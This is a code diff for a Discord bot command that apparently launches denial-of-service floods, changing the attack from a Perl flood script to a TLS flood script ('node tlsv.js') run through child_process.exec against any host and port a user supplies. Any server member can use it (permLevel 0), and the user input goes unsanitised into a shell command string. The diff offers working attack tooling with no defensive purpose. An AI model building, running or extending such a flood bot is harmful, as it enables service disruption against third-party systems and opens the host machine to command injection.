@@ -17,7 +17,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;home 1.1.1.1 80 60`")
+	.setDescription("`Ex ;tls https://akusygkmu.com 443 60`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
+exec(`node tlsv.js ${host} ${port} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -70,12 +70,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['home'],
+  aliases: ['tls'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'home',
+  name: 'tls',
   description: 'zxcr9999',
-  usage: 'home'
+  usage: 'tls'
 }
